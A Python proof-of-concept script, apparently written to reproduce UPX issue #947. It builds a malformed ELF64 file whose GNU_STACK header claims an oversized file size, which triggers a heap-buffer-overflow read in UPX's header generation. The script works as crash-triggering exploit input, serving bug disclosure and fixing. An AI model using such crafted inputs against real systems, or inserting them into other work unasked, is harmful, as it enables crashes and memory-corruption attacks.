#!/usr/bin/env python3
"""Generate malformed ELF64 that triggers heap-buffer-overflow in UPX

Reproduces upx/upx#947. The PoC sets GNU_STACK p_filesz to 0xff00 (65280)
inside an otherwise-well-formed ELF64 header, while the total file image
is only ~45 KiB. UPX's PackLinuxElf64::generateElfHdr() writes p_filesz
bytes from file_image[p_offset] without bounds-checking against the
allocation, reading off the end.
"""
import struct

def create_poc(output='poc.bin'):
    ehdr = struct.pack('<4sBBBBB7xHHIQQQIHHHHHH',
        b'\x7fELF', 2, 1, 1, 0, 0,
        2, 62, 1, 0x1200, 64, 31648, 0x20000007,
        64, 56, 11, 64, 33, 32)

    phdrs = [
        struct.pack('<IIQQQQQQ', 6,          4, 0x40,   0x40,    0x40,    0x268,  0x268,  8),       # PHDR
        struct.pack('<IIQQQQQQ', 3,          4, 0x46e0, 0x46e0,  0x46e0,  0xb2,   0xb2,   1),       # INTERP
        struct.pack('<IIQQQQQQ', 0x70000003, 4, 0x2a8,  0x2a8,   0x2a8,   0x18,   0x18,   8),       # LOPROC
        struct.pack('<IIQQQQQQ', 1,          5, 0,      0,       0,       0x48d0, 0x48d0, 0x10000), # LOAD (code)
        struct.pack('<IIQQQQQQ', 1,          6, 0x4fbf, 0x14fbf, 0x14fbf, 0x29f1, 0x3631, 0x10000), # LOAD (data)
        struct.pack('<IIQQQQQQ', 2,          4, 0x3b0,  0x3b0,   0x3b0,   0x270,  0x270,  8),       # DYNAMIC
        struct.pack('<IIQQQQQQ', 7,          4, 0x4fd8, 0x14fd8, 0x14fd8, 0x1000, 0x1800, 8),       # TLS
        struct.pack('<IIQQQQQQ', 0x6474e550, 4, 0x4794, 0x4794,  0x4794,  0x2c,   0x2c,   4),       # GNU_EH_FRAME
        struct.pack('<IIQQQQQQ', 0x6474e551, 7, 0,      0,       0,       0xff00, 0,      0x1000),  # GNU_STACK (vuln)
        struct.pack('<IIQQQQQQ', 0x6474e552, 4, 0x4fbf, 0x14fbf, 0x14fbf, 0x4100, 0x4100, 1),       # GNU_RELRO
        struct.pack('<IIQQQQQQ', 0,          0, 0,      0,       0,       0,      0,      0),       # NULL
    ]

    data = bytearray(ehdr)
    for p in phdrs:
        data.extend(p)
    target_size = 45643
    data.extend(b'\x00' * (target_size - len(data)))

    with open(output, 'wb') as f:
        f.write(data[:target_size])
    print(f"wrote {output} ({target_size} bytes)")


if __name__ == '__main__':
    create_poc()
